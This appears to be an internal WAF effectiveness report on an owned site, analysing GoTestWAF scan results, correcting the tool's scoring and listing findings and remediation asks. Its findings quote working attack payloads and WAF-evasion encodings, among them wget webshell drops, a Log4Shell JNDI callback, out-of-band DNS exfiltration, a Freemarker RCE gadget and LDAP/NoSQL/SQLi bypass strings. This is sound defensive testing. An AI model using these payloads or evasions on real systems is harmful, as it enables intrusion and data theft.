# WAF effectiveness test — superman.chubbyduck.org

## 0. Document control

| Field | Value |
| --- | --- |
| Target | `https://superman.chubbyduck.org` |
| WAF product / version | `<WAF_PRODUCT>` / `<WAF_VERSION>` — **to be filled, see §14** |
| Ruleset / sensitivity | `<RULESET>` / `<PARANOIA_LEVEL>` |
| Enforcement mode at scan time | `<MODE>` (blocking or detection-only) |
| Origin | nginx + Flask on server A, port 80, behind the WAF |
| Tool | Wallarm GoTestWAF **v0.5.8** (`wallarm/gotestwaf`) |
| Test corpus fingerprint | `9a85b1a04fae92196ad6513c8aaa5995` |
| Run analysed (baseline) | report timestamp `2026-August-12-07-00-37`, `--wafName=my-waf` |
| Origin commit at scan time | **pre-`60abd98`** — see §5, this materially limits the result |
| Status | Baseline. Retest pending (§13) |
| Author / date | `<AUTHOR>`, 2026-08-12 |
| Distribution | `<INTERNAL / SHAREABLE WITH VENDOR>` — see §14 item 8 |

Two scans were run about 26 minutes apart on 2026-08-12 and both behaved identically at
the origin. This document analyses the `07-00-37` run, whose full HTML artifact is
available (sha256 `c5b23b98a727ed90a0d2b31c8fff347eceb7d3f884cc46a90d1a3fca8cbe0c51`).
Every figure below is derived from that artifact, not from the tool's headline grades —
§4 explains why that distinction matters more than usual here.

---

## 1. Executive summary

The WAF blocks the common, plainly-encoded forms of most attack classes, and it almost never
blocks legitimate traffic. It has two structural weaknesses: **several attack classes have
no coverage at all**, and **re-encoding a payload defeats signatures that catch its
plaintext equivalent**. Separately, a misconfiguration on our own origin invalidated about a
third of the test corpus, so the WAF's ability to inspect request *bodies* is currently
unknown — neither proven nor disproven.

| Metric | Tool's figure | Corrected | Why they differ |
| --- | --- | --- | --- |
| Attack requests sent | 675 | 675 | — |
| Blocked (403) | 400 | 400 | — |
| **Bypassed, reached the application (200)** | — | **≈59** | tool does not separate these |
| Unblocked but no sink reached (404) | — | ≈45 | payload hit a non-existent path |
| **Untested — origin refused (405)** | counted as bypassed | **≈172** | see §5 |
| Untested — connection dropped | 15 "failed" | 15 | 8–128 KB bodies |
| **Block rate** | **60.6%** | **79.4%** (400/504) | over genuinely tested requests only |
| **False-positive rate** | **67.4%** (95/141) | **6.1%** (3/49) | 92 of the 95 were 405s, not blocks |
| Overall grade | **F, 59.0%** | not meaningful | grade includes the 405 artifacts |

Reported grades were API Security **C- (71.4%)**, Application Security **F (46.5%)**,
overall **F (59.0%)**. The corrected block rate of 79.4% is the number to quote; the
corrected false-positive rate of 6.1% is a single benign string, not a systemic problem.

**The five asks, in priority order** (detail in §11):

1. **R-01 — Complete the request normalisation pipeline.** Base64, overlong UTF-8, double
   URL-encoding, MySQL versioned comments and `$IFS` all defeat rules that catch the
   plaintext payload. One decoder fixes many findings at once.
2. **R-02 — Enable the missing rule groups**: LDAP injection, SMTP/IMAP command injection,
   server-side includes, CRLF/response splitting, XML/XXE. Each is currently **0% blocked**.
3. **R-03 — Add generic OS-command-execution and template-injection coverage.** A webshell
   dropper, a Python `exec` gadget and the canonical Freemarker `?new()` gadget all reached
   the application.
4. **R-04 — State the request-body inspection limit** and explain the dropped connections
   on bodies of 8 KB and above.
5. **R-05 / R-09 — Confirm which request headers are inspected**, and whether the bypassed
   requests were logged and allowed or never examined at all. Those are different defects.

---

## 2. Scope, authorisation and topology

Authorised test of infrastructure we own and operate. No third-party systems were touched;
all traffic went to our own domain and our own origin.

```
                     TLS cert issued by ../script/waf_cert.sh
                                     │
   GoTestWAF  ──HTTPS──▶  [ <WAF_PRODUCT> ]  ──HTTP:80──▶  [ server A ]
   (this scan)             DNS points here                  nginx + Flask
                                                            (the origin)
```

The origin is **deliberately permissive**: it applies no filtering of any kind and answers
`200` to everything it can. That is the point — it means every block observed in this test
came from the WAF, so the numbers describe the WAF and not our application. See
`../website/README.md`.

**Out of scope:** origin hardening, authentication and authorisation, business logic,
denial of service, rate limiting, TLS configuration, and the WAF's management plane.

---

## 3. Methodology

Run via [`../script/run_gotestwaf.sh`](../script/run_gotestwaf.sh). The exact arguments,
as recorded by the tool itself in the report artifact:

```
--url=https://superman.chubbyduck.org --wafName=my-waf --blockStatusCodes=403
--passStatusCodes=200,404 --workers=5 --maxIdleConns=5 --followCookies --renewSession
--includePayloads --addDebugHeader --noEmailReport --nonBlockedAsPassed
--reportFormat=html,json --reportPath=/app/reports
```

| Flag | Meaning |
| --- | --- |
| `--blockStatusCodes=403` | only a `403` counts as the WAF blocking |
| `--passStatusCodes=200,404` | `200` **and `404`** count as not blocked |
| `--nonBlockedAsPassed` | any *other* status is folded into "passed" rather than reported separately |
| `--followCookies` / `--renewSession` | maintain a session, so cookie-gated WAFs are exercised |
| `--includePayloads` | write payloads into the report, needed to reproduce findings |
| `--addDebugHeader` | tag each request with its test case, for log correlation |
| `--workers=5` | five concurrent workers; 816 requests total |

The corpus is a fixed matrix of **test set × test case × payload × placeholder × encoder**.
Placeholders are the position of the payload in the request — `URLParam`, `URLPath`,
`Header`, `UserAgent`, `HTMLForm`, `HTMLMultipartForm`, `JSONRequest`, `XMLBody`,
`SOAPBody`, `RawRequest`. Encoders are `Plain`, `URL` and `Base64Flat`. Payloads cannot be
chosen or added — see the glossary in §16.

---

## 4. How the score is derived, and why it matters here

**GoTestWAF classifies a request solely by its HTTP status code. The response body plays
no part.** With `--blockStatusCodes=403` and `--passStatusCodes=200,404`, four consequences
follow, and all four are live in this result:

1. **A status that is in neither list is not reported as unknown — it is silently
   reclassified.** `--nonBlockedAsPassed` files it as *passed*. For an attack payload that
   reads as "the WAF let it through"; for a benign payload it lands in the true-negative
   table as "blocked", i.e. a false positive. The report's summary then states
   `Number of unresolved requests: 0` while 264 requests in its own detail tables carry a
   status of `405`. **This is the single most misleading thing in the raw report.**
2. **A `404` counts as "not blocked" even though nothing was reached.** At scan time the
   origin returned `404` for unknown URL paths, so every payload placed in the URL path
   was scored a bypass without ever arriving at application code.
3. **No verdict here proves exploitation.** A `200` means the WAF did not block; on its own
   it does not mean the payload would have executed. §8 marks which findings have
   corroborating evidence of reaching an application sink and which do not.
4. **A dropped connection is counted as "failed", not blocked.** Fifteen large-body cases
   ended this way and are untested, not defended.

This report therefore re-buckets every request five ways, which the tool will not do:

| Bucket | Meaning |
| --- | --- |
| **Blocked** | `403` — the WAF stopped it. A genuine pass for the WAF. |
| **Bypassed** | `200` — reached the application. A genuine finding. |
| **Unproven** | `404` — not blocked, but no application sink was reached. |
| **Untested (405)** | the origin refused the request before the WAF's decision was observable. |
| **Untested (failed)** | the connection dropped. |

---

## 5. Coverage and validity limitations

### 5.1 The 405 problem — our fault, not the WAF's

At scan time the origin's nginx served the site statically and answered `405 Method Not
Allowed` to any `POST`/`PUT`/`PATCH`/`DELETE`, **without reading the request body**. Every
payload GoTestWAF placed in a body therefore never reached an application, and `405` is in
neither status list, so `--nonBlockedAsPassed` recorded it as a bypass (or, for benign
input, as a false positive).

This must not be read as a WAF failure, and equally must not be read as a WAF success:

| Affected | Requests | Consequence |
| --- | --- | --- |
| Attack payloads in a body placeholder | ≈172 | scored as bypasses; actually untested |
| Benign payloads in a body placeholder | 92 | scored as false positives; actually untested |
| **Total corpus invalidated** | **≈264 of 816 (32%)** | |

Entire cases were lost this way: `community-xxe`, `owasp/xml-injection`,
`community-lfi-multipart`, and the `owasp-api` SOAP rows — every XML and SOAP test in the
corpus. **The WAF's request-body and XML inspection capability is therefore unmeasured.**

Root cause and fix: the origin's nginx configuration and Flask app now hand every method,
content type and unknown path to the application, which answers `200` and records what it
received. That landed in commit `60abd98` and was extended afterwards; the retest in §13 is
gated on it being deployed and verified. `run_gotestwaf.sh` now probes each placeholder
shape before scanning and refuses to proceed quietly if any is unscoreable.

### 5.2 Other limitations

- **`404`-only findings prove nothing about reach.** All 7 CRLF payloads and several XSS and
  path-traversal rows returned `404`. They were not blocked, which is a real coverage
  observation, but no impact can be claimed. Marked *unproven* throughout.
- **Fifteen large-body cases dropped the connection** (`community-8kb` … `community-128kb`,
  each of `rce`/`sqli`/`xss`). Untested. Since the origin's body limit at the time was
  nginx's 1 MB default, a 128 KB body should have been accepted — so the drop most likely
  happened at the WAF. That is ask R-04.
- **One request returned `400`** (`<<scr\x00ipt/src=…` in the URL path): a NUL byte in the
  path is rejected before the application. Expected, one row, not pursued.
- **The four-way split of the 260 bypassed requests is derived, not read directly.** The
  HTML groups encoders and placeholders per row, so the cross-product slightly overcounts.
  17 of 20 test cases reconcile exactly against the aggregate table; `path-traversal`,
  `soap` and `xss-scripting` do not, and account for the whole discrepancy (277 derived vs
  260 reported). Figures involving those three are marked ≈. The `.json`/`.csv` artifacts
  resolve this exactly — see §14 item 2.
- **Enforcement mode unconfirmed.** If the WAF was in detection-only mode for some rule
  groups, a "bypass" may be a logged-but-allowed detection. §14 item 6.
- **Single run, no evasion tuning, no rate-limit or bot testing.** 816 requests from one
  source IP at 5 workers; if the source was throttled or challenged mid-scan, later rows
  are less reliable.

---

## 6. Results

Totals reconcile exactly: `675 + 141 = 816` sent, `400 + 95 = 495` blocked,
`260 + 46 = 306` passed, `15` failed.

### 6.1 By test set (attack sets only)

| Test set | Sent | Blocked | Bypassed (tool) | Failed | Block rate over resolved |
| --- | --- | --- | --- | --- | --- |
| `community` | 159 | 114 | 30 | 15 | 79.2% |
| `owasp` | 502 | 276 | 226 | 0 | 55.0% |
| `owasp-api` | 14 | 10 | 4 | 0 | 71.4% |
| **Total** | **675** | **400** | **260** | **15** | **60.6%** |

The `owasp` set's 55.0% is dominated by the five zero-coverage cases in §6.3 and by the 405
artifacts, not by weak signatures across the board.

### 6.2 Re-bucketed by observed status

| Test case | Sent | Blocked | Bypassed (200) | Unproven (404) | Untested (405) | Exact? |
| --- | --- | --- | --- | --- | --- | --- |
| `sql-injection` | 48 | 48 | 0 | 0 | 0 | yes |
| `community-rce` | 4 | 4 | 0 | 0 | 0 | yes |
| `community-rce-rawrequests` | 3 | 3 | 0 | 0 | 0 | yes |
| `xss-scripting` | 224 | 194 | ≈4 | ≈8 | ≈13 | **no** |
| `community-xss` | 104 | 96 | 2 | 0 | 6 | yes |
| `community-sqli` | 12 | 8 | 1 | 0 | 3 | yes |
| `sst-injection` | 24 | 8 | 4 | 4 | 8 | yes |
| `shell-injection` | 32 | 8 | 6 | 0 | 18 | yes |
| `nosql-injection` | 50 | 10 | 8 | 8 | 24 | yes |
| `rce-urlparam` | 9 | 3 | 2 | 0 | 4 | yes |
| `community-lfi` | 8 | 2 | 1 | 0 | 5 | yes |
| `path-traversal` | 20 | 2 | ≈3 | ≈4 | ≈11 | **no** |
| `rce` | 6 | 2 | 2 | 0 | 2 | yes |
| `rce-urlpath` | 3 | 1 | 0 | 2 | 0 | yes |
| `community-user-agent` | 9 | 1 | 8 | 0 | 0 | yes |
| `ldap-injection` | 24 | 0 | 6 | 0 | 18 | yes |
| `mail-injection` | 24 | 0 | 6 | 6 | 12 | yes |
| `ss-include` | 24 | 0 | 6 | 6 | 12 | yes |
| `crlf` | 7 | 0 | 0 | 7 | 0 | yes |
| `xml-injection` | 7 | 0 | 0 | 0 | 7 | yes |
| `community-xxe` | 2 | 0 | 0 | 0 | 2 | yes |
| `community-lfi-multipart` | 2 | 0 | 0 | 0 | 2 | yes |
| `rest` (owasp-api) | 7 | 5 | 0 | 0 | 2 | yes |
| `soap` (owasp-api) | 5 | 4 | 0 | 0 | ≈1 | **no** |
| `non-crud` (owasp-api) | 2 | 1 | 0 | 0 | ≈1 | **no** |
| `community-8kb…128kb` (×15 cases) | 15 | 0 | 0 | 0 | — | 15 connection failures |
| **Total** | **675** | **400** | **≈59** | **≈45** | **≈172** | see note |

`Sent` and `Blocked` are read directly from the report and reconcile exactly (675 and 400).
The three status columns are **derived**: the HTML detail tables group encoders and
placeholders per row, so expanding them names some combinations that were never sent. For
the 22 rows marked *yes* the derived split sums exactly to `Sent − Blocked`; for
`path-traversal`, `soap`, `non-crud` and `xss-scripting` it does not, and those four
account for the whole gap between the derived total (276) and the reported 260 bypassed
requests. `xss-scripting` additionally has 1 request at `400` and 4 unattributed. The
`.csv` artifact has one row per payload × placeholder × encoder and resolves all of it —
§14 item 2.

`sql-injection` at 48/48, `xss-scripting` at 194/224 and `community-xss` at 96/104 show the
WAF's signature coverage is strong where it exists. The failures are concentrated in
specific cases, not spread thinly across the corpus.

### 6.3 Cases with **zero** blocked requests

| Case | Sent | Status of the unblocked requests |
| --- | --- | --- |
| `ldap-injection` | 24 | 6 × 200, 18 × 405 |
| `mail-injection` | 24 | 6 × 200, 6 × 404, 12 × 405 |
| `ss-include` | 24 | 6 × 200, 6 × 404, 12 × 405 |
| `crlf` | 7 | 7 × 404 |
| `xml-injection` | 7 | 7 × 405 — **entirely untested** |
| `community-xxe` | 2 | 2 × 405 — **entirely untested** |
| `community-lfi-multipart` | 2 | 2 × 405 — **entirely untested** |

The first four are real, actionable coverage gaps. The last three are untested and appear
here only so they are not mistaken for either result.

### 6.4 Baseline vs retest

| Metric | Baseline | Retest | Delta |
| --- | --- | --- | --- |
| Requests sent | 816 | — | — |
| Block rate over tested | 79.4% | — | — |
| Reached the application (200) | ≈59 | — | — |
| Untested (405 + failed) | ≈187 | — | — |
| Genuine false positives | 3 | — | — |

---

## 7. Severity rubric

Severity rates **the rule-coverage gap**, not exploitability against this origin — the
origin is a test harness with simulated sinks, so a CVSS vector would be fabricated. Four
factors:

1. **Base — impact if the payload reached a real sink.** Critical: OS command execution,
   webshell drop, template-injection-to-exec, unsafe deserialisation. High: SQLi, local
   file read, XXE, LDAP auth-bypass primitives, NoSQL operator injection, JNDI. Medium:
   reflected XSS, CRLF/response splitting, SMTP/IMAP command injection. Low: tool
   fingerprints.
2. **Confirmation, applied as a cap.** Reached the application (`200`) → no cap. `404` only
   → capped at **Medium** and labelled *unproven*. `405` or connection-failed → **no
   severity, untested**.
3. **Placeholder scope.** Every placeholder in this corpus is attacker-controlled, so this
   only escalates: a payload blocked in one placeholder and passed in another is an
   inconsistency worth one level.
4. **Systemic multiplier.** Escalate one level if the entire case passed (category gap
   rather than a missing signature), or if an encoded variant passed while its plaintext
   equivalent was blocked (a missing normalisation step, which generalises to every other
   class for free).

Factor 2's cap always beats factor 4's escalation.

---

## 8. Findings

### F-01 — Incomplete input normalisation *(Critical, systemic)*

**CWE-176 / CWE-172.** Rules that catch a payload in plaintext or single URL-encoding fail
on the same payload re-encoded. This is one root cause behind F-04, F-06, F-07, F-08 and
F-09, and it is the highest-value fix in this report. Proof is in matched pairs from the
same case:

| Case | Blocked form | Bypassed form | Missing transform |
| --- | --- | --- | --- |
| `path-traversal` | `%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd` (URL) → **403** | same payload, `Base64Flat` → **200** | base64 decode before matching |
| `community-lfi` | `file:%2F%2F%2Fetc%2F.%2Fpasswd` → **403** | `%25C0%25AE%25C0%25AE%25C0%25AF…etc%25C0%25AFpasswd` → **200** | overlong-UTF-8 / double URL decode |
| `community-sqli` | full versioned-comment UNION with column list → **403** | `/*!%2555NiOn*/%2520/*!%2553eLEct*/` → **200** | MySQL `/*!…*/` comment removal |
| `shell-injection` | `%3Bwget%20http://some_host/sh311.sh` → **403** | `;getent$IFS$9hosts$IFS$9…` → **200** | shell whitespace (`$IFS`) normalisation |
| `xss-scripting` | `<svg onload=alert(1)>` family → **403** | `\"autof<x>ocus o<x>nfocus=alert<x>(1)//` → **200** | strip keyword-splitting tags |

`ldap-injection`, `mail-injection`, `nosql-injection`, `ss-include`, `shell-injection` and
`sst-injection` each passed under **both** `URL` and `Base64Flat`, so for those the decoder
gap compounds an already-absent rule group.

*Note for the vendor:* a thirty-line stdlib classifier in our own origin
(`website/api/sinks.py`) recognises all of these by URL-decoding twice, HTML-unescaping,
base64-decoding long tokens and stripping split-tags before matching. The transforms are
not exotic.

### F-02 — Verdict depends on payload position *(High, systemic)*

**CWE-693.** The same attack class is blocked in one placeholder and allowed in another, so
one consistent policy is not applied across the request. Clearest case: `owasp/rce` — some
command-injection payloads in a request **header** were blocked (403), while
`` ax--exec=`id`--remote=origin `` and `; cat /et'c/pa'ss'wd` in a header returned **200**.
Combined with F-01 this means the measured block rate does not transfer to header-borne or
body-borne traffic. Ask R-05 is simply: *tell us which headers you inspect.*

### F-03 — LDAP injection: no coverage *(High)*

**CWE-90.** `owasp/ldap-injection`, **0 of 24 blocked**; 6 requests reached the application,
18 untested. All three payloads passed under both encoders in `URLParam`:

- `(&(uid=admin)(!(&(1=0)(userPassword=q))))` — authentication-bypass primitive
- `*(|(objectclass=*))` — full directory enumeration
- `userPassword:2.5.13.18:=123` — extensible-match filter abuse

Capped at High: impact requires an LDAP-backed authentication sink.

### F-04 — NoSQL operator injection *(High)*

**CWE-943.** `owasp/nosql-injection`, 10 of 50 blocked; 8 reached the application. The
pattern is diagnostic: literal payloads such as `db.injection.insert({success:1});` **were**
blocked, while operator-based injection was not:

- `true, $where: '99 == 88'` — server-side JavaScript execution
- `', $or: [ {}, { 'order':'order` — filter injection / authentication bypass
- `0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)` — a
  server-side busy-loop, i.e. denial of service through the query engine

So the WAF has string signatures for NoSQL but no structural inspection of JSON operators.
Escalated one level for that.

### F-05 — Server-side includes: no coverage *(High)*

**CWE-97.** `owasp/ss-include`, **0 of 24 blocked**; 6 reached the application. All three
`<!--#exec cmd="…">` payloads passed under both encoders, including
`<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->` — a
webshell drop. Base impact is Critical, held at High because SSI must be enabled on the
origin for it to fire.

### F-06 — Server-side template injection *(High)*

**CWE-1336.** `owasp/sst-injection`, 8 of 24 blocked; 4 reached the application:

- `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}` — the canonical
  Freemarker RCE gadget. Its absence is a coverage failure, not an exotic evasion.
- `aaaa'%2b#{16*8787}%2b'bbb` — Spring-EL style expression injection

### F-07 — OS command injection reached the application *(Critical)*

**CWE-78 / CWE-94 / CWE-502.** Ten requests across three cases returned `200`:

| Case | Payload | Placeholder | Note |
| --- | --- | --- | --- |
| `shell-injection` | `;getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3482*7301));` | `URLParam`, both encoders | out-of-band DNS callback **and** an arithmetic oracle — two independent confirmation channels |
| `shell-injection` | `\|getent+hosts+somehost.burpcollaborator.net.&` | `URLParam`, both encoders | out-of-band DNS exfiltration |
| `shell-injection` | `\| set /a 3482*7301` | `URLParam`, both encoders | Windows variant |
| `rce-urlparam` | `Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:…` | `URLParam` | ASP/VBScript webshell dropper that fetches a second stage over HTTP |
| `rce-urlparam` | `!!python/object/new:exec [import socket; socket.gethostbyname(…)]` | `URLParam` | unsafe-YAML deserialisation gadget |
| `rce` | `` ax--exec=`id`--remote=origin ``, `; cat /et'c/pa'ss'wd` | `Header` | see F-02 |

The two `rce-urlparam` payloads are long and unmistakable; missing them indicates no
generic code-execution coverage for those syntax families. `shell-injection` was 8/32
blocked, so the gap is specifically the evasion forms — F-01 again.

### F-08 — Path traversal and local file read *(High)*

**CWE-22.** `owasp/path-traversal` 2 of 20 blocked, plus `community-lfi` at 2 of 8. Reached the
application:

- `/static/img/../../etc/passwd` under `Base64Flat` — the URL-encoded form of this exact
  payload was blocked (F-01)
- `\\::1\c$\users\default\ntuser.dat` under both encoders — a Windows UNC path; no UNC
  handling at all
- `%25C0%25AE%25C0%25AE%25C0%25AF…etc%25C0%25AFpasswd` — overlong-UTF-8 traversal

### F-09 — SQL injection evasion *(High)*

**CWE-89.** `owasp/sql-injection` was **48 of 48 blocked** — coverage there is complete.
But `community-sqli` let `/*!%2555NiOn*/%2520/*!%2553eLEct*/` through to the application.
MySQL executes versioned comments, so this is a working `UNION SELECT` against a MySQL
application while the plaintext equivalent is blocked.

### F-10 — Log4Shell / JNDI in the User-Agent *(High)*

**CWE-917.** `${jndi:ldap://${hostName}.w63gecoroprj5um8ypnd7r6in9t0hseg3.oast.me/a}`
returned `200`. Pre-authentication RCE wherever a vulnerable logger is present, and one of
the most widely shipped signatures in existence. Rated separately from F-14 deliberately.

### F-11 — SMTP/IMAP command injection: no coverage *(Medium)*

**CWE-93 / CWE-77.** `owasp/mail-injection`, **0 of 24 blocked**; 6 reached the application:
`RCPT TO: test@evil.com`, `QUIT`, `V100 CAPABILITY\nV101 FETCH 4791`. Open-relay and mail
header injection where a mail-sending endpoint exists. Category gap escalates it from
Low-Medium; capped at Medium because the sink is narrow.

### F-12 — Reflected XSS evasion *(Medium)*

**CWE-79.** `xss-scripting` 194 of 224 blocked, ≈4 reached the application;
`community-xss` 96 of 104 blocked, 2 through. Coverage is strong; these are mutation/obfuscation gaps:
`alert.apply(null, [1])`, `\"autof<x>ocus o<x>nfocus=alert<x>(1)//`, `document["cookie"]`,
`&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;`.

### F-13 — CRLF / response splitting: no coverage *(Medium, unproven)*

**CWE-113.** `owasp/crlf`, **0 of 7 blocked** — but all 7 returned `404`, so factor 2 caps
this and forbids an impact claim. All seven encodings passed, including
`%0d%0aSet-Cookie:crlf=injection`, the double-encoded `%25%30%44%25%30%41…` and the
overlong `%e5%98%8d…`. The retest will place these in a parameter and a header, where a
sink exists, and should upgrade or close this.

### F-14 — Automated scanners not fingerprinted *(Low)*

**CWE-778.** Seven scanner User-Agents returned `200`: `sqlmap/1.7.4#stable`, `Nuclei`,
`Fuzz Faster U Fool v2.0.0` (ffuf), `Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4.1)`,
`Microsoft WinRM Client OpenVASVT`, `mercuryboard_user_agent_sql_injection.nasl'`, and a
Chrome UA carrying an `interact.sh` callback host. Only one of the nine User-Agent payloads was blocked.

Deliberately rated **Low**: a User-Agent is trivially spoofed, so blocking these is noise
reduction and defence in depth, not a control. It is still worth asking for, because it is
normally a one-line ruleset toggle and it makes reconnaissance visible.

### F-15 — False positive on a benign search string *(Low security / Medium business)*

The benign string **`java lang courses`** was blocked with `403` in three placeholders
(`URLParam`, `HTMLForm`, `HTMLMultipartForm`), URL encoder, from the `false-pos/texts` set.
A plausible course-catalogue or product search term returning 403 is a live availability
defect for real users. This is a tuning request, not a rule gap — see §10.

---

## 9. Untested — neither a pass nor a fail

No severity is assigned to anything in this section. Assigning one would be wrong, and it
is the fastest way to lose the argument about everything else in this report.

| Group | Requests | Why untested | Resolved by |
| --- | --- | --- | --- |
| `community-xxe`, `owasp/xml-injection` — **all XML/XXE tests** | 9 | origin answered `405` to `XMLBody` | retest |
| `owasp-api` SOAP rows | ≈12 | origin answered `405` to `SOAPBody` | retest |
| `community-lfi-multipart` | 2 | origin answered `405` to multipart | retest |
| Body-borne variants of `ldap`, `mail`, `nosql`, `ss-include`, `sst`, `shell`, `path-traversal`, `lfi`, `sqli`, `xss`, `rce` | ≈149 | origin answered `405` to form/JSON bodies | retest |
| `community-8kb` … `community-128kb` (`rce`/`sqli`/`xss`) | 15 | connection dropped | R-04 + retest |
| NUL byte in URL path | 1 | rejected with `400` before the application | accepted limitation |

**Until the retest, no claim can be made in either direction about this WAF's ability to
inspect request bodies, XML or SOAP.** That is roughly a third of the corpus.

---

## 10. False positives

The tool reports a 67.4% false-positive rate (95 of 141 benign requests "blocked"). That
figure is an artifact and should not be quoted:

| | Requests |
| --- | --- |
| Benign requests sent | 141 |
| Recorded as blocked by the tool | 95 |
| — of which actually returned `405` (origin refused, untested) | **92** |
| — of which actually returned `403` (genuine false positive) | **3** |
| Benign requests genuinely tested | 49 |
| **Corrected false-positive rate** | **3 / 49 = 6.1%** |

All three genuine false positives are the same payload, `java lang courses`, in three
placeholders (F-15). Roughly 46 other benign strings passed correctly, including ones
designed to look dangerous — `union was a great select`, `exec noun`,
`JavaScript: Basics of JavaScript Language`, `D'or 1st parfume`, `zsh is the best!`.

Reading: the ruleset is **not** over-blocking. One rule is matching the token sequence
`java` + `lang` (probably targeting `java.lang.Runtime`) without requiring the package
syntax around it. Ask R-06.

---

## 11. Remediation asks for the WAF operator

| ID | Priority | Ask | Closes | Acceptance test |
| --- | --- | --- | --- | --- |
| R-01 | **P1** | Apply full request normalisation before matching: base64 decode, repeated URL decode, overlong-UTF-8 and Unicode normalisation, MySQL `/*!…*/` comment removal, shell whitespace (`$IFS`) folding, HTML entity decode, split-tag removal. | F-01, and the encoded halves of F-04, F-06, F-07, F-08, F-09, F-12 | Re-send each "bypassed form" in F-01's table; all must return 403 |
| R-02 | **P1** | Enable the rule groups that are currently 0% blocked: LDAP injection, SMTP/IMAP command injection, server-side includes, CRLF/response splitting, XML/XXE. | F-03, F-05, F-11, F-13 | Each case's block rate goes from 0% to ≥95% on retest |
| R-03 | **P1** | Add generic code-execution and template-injection coverage: ASP/VBScript `Execute`-style droppers, YAML/Python deserialisation gadgets, Freemarker `?new()`, Spring-EL `#{…}`. | F-06, F-07 | The six payloads in F-07's table and both in F-06 return 403 |
| R-04 | **P1** | State the **request-body inspection byte limit**, and explain why bodies of 8 KB and above dropped the connection. Confirm whether bodies over the limit are inspected, passed, or rejected. | §9 large-body rows | A 128 KB POST completes with a definite 200 or 403, not a reset |
| R-05 | **P2** | List exactly **which request headers are inspected**, and apply the same ruleset to headers and bodies as to query parameters. | F-02, F-10 | The two header payloads in F-07 return 403 |
| R-06 | **P2** | Tune the rule matching `java lang courses` to require Java package syntax rather than the bare tokens. | F-15 | The string returns 200 in all three placeholders, with no loss on F-07/F-09 |
| R-07 | **P2** | Add structural JSON inspection for NoSQL operators (`$where`, `$ne`, `$or`, `$regex`) rather than literal-string signatures. | F-04 | The four payloads in F-04 return 403 |
| R-08 | **P3** | Enable known-scanner and known-tool User-Agent signatures, and add a JNDI/`${jndi:` signature covering all headers. | F-10, F-14 | The eight UA payloads in F-14/F-10 return 403 |
| R-09 | **P3** | Confirm, for a sample of the bypassed requests in §8, whether each was **logged and allowed** or **never inspected**, and supply the rule IDs that fired on the blocked ones. | validity of §8 | Log excerpts provided |

R-01 and R-02 together account for the large majority of findings. R-01 is the single
highest-leverage change: it converts existing signatures into ones that cannot be trivially
evaded.

---

## 12. Internal actions

| Owner | Action | Status |
| --- | --- | --- |
| us | Make the origin answer `200` for every method, content type and path so no test case is unscoreable | done — `60abd98` and follow-ups; **needs deploying to server A** |
| us | Add per-request evidence logging at the origin so a bypass can be tied to the payload that arrived | done (`website/api/`) — needs deploying |
| us | Pre-flight check in `run_gotestwaf.sh` that refuses to scan when a placeholder shape is unscoreable | done |
| us | Narrow `--pass-codes` to `200` so a `404` is never scored as a bypass | done |
| us | Copy the scan artifacts (`.csv`, `.json`, `.html`) into `docs/evidence/<run-id>/` and record sha256 | **outstanding** |
| us | Identify the WAF product, version, ruleset and enforcement mode (§14) | **outstanding** |
| us | Retest and complete §6.4 | **outstanding** |
| WAF operator | R-01 … R-09 | **outstanding** |

Not in our gift: the WAF's rule content, its body-inspection limit, and its logging. Those
are R-01 … R-09.

---

## 13. Retest plan

**Preconditions** — all must hold, or the retest repeats the baseline's mistake:

1. Origin deployed at `60abd98` **or later, including the status-normalisation and evidence
   logging changes**, verified on server A: `POST /` → 200, `POST /` with an XML body →
   200, multipart → 200, `GET /no-such-path` → 200, and `X-Origin-Build` present.
2. Certificate renewal still working — the ACME challenge path must return its file, not
   application JSON.
3. GoTestWAF image digest pinned and recorded, corpus fingerprint still
   `9a85b1a04fae92196ad6513c8aaa5995`. If it changes, per-case comparison is invalid and
   must be annotated.
4. WAF product, version, ruleset and mode recorded in §0.
5. Negative controls first: a plain `UNION SELECT` and a plain `<script>alert(1)</script>`
   in `URLParam` must both return **403**. Without this, a reproduced "bypass" might only
   mean the WAF is off or DNS has moved.

**Command**

```bash
./script/run_gotestwaf.sh --url https://superman.chubbyduck.org \
  --waf-name '<WAF_PRODUCT>' --pass-codes 200
```

**Acceptance criteria**

| Criterion | Target |
| --- | --- |
| Rows with status `405` | **0** |
| Unresolved / unknown rows | 0 (the single `400` NUL-byte row may remain) |
| `URLPath` rows returning `404` | 0 |
| Every bypassed row has an origin evidence-log line with a non-null `category` | yes |
| Block rate over tested requests, `owasp` set | ≥95% |
| Critical findings (F-01, F-07) blocked | all |
| Genuine false-positive rate | <1% |

**The bypass count is expected to go up, not down.** Roughly 187 requests were untested in
the baseline; measuring them for the first time will surface failures that were previously
invisible. A higher number in the retest is the measurement improving, not the WAF
regressing — §6.4 must be read with that in mind.

---

## 14. Still needed

Blocking publication or external distribution:

1. **WAF product, vendor, version, ruleset name and version, sensitivity/paranoia level,
   and enforcement mode at scan time.** Both scans ran with `--wafName=my-waf` /
   `unknown-waf`. A document that asks for rule coverage but cannot name the product is not
   sendable. Sources: the WAF console; the response headers captured when reproducing a
   block; GoTestWAF's own WAF-identification output at the top of the scan log.
2. **The `20260812-072616` artifacts** — `waf-evaluation-report-*.csv`, `.json` and `.html`
   from `~/waf-testing/script/reports/` on server A. The `.csv` has one row per
   payload × placeholder × encoder and makes §6.2's three approximate rows exact.
3. **Which run is authoritative**, and what changed between `07:00:37` and `07:26:16`.
   Ideally the earlier run's `.csv`/`.json` too, as a cross-check.
4. **GoTestWAF's WAF-identification result.** If it identified nothing, that is itself
   reportable: no vendor block-page fingerprint, i.e. generic 403s.
5. **Server A's timezone and the deployed commit at scan time**, to fix the UTC window and
   confirm §5.1's root cause.
6. **The WAF's log entries** for a sample of blocked and bypassed requests, correlated via
   the `--addDebugHeader` header (name and value format needed so the operator can grep).
   For each bypass: *logged and allowed*, or *never inspected*? Different defects, different
   asks. Plus the rule IDs that fired on blocked cases, and the WAF's transaction IDs.
7. **Whether the scanner's source IP was rate-limited, greylisted or challenged mid-scan.**
8. **Whether this document may name the vendor externally**, for the §0 distribution line.

---

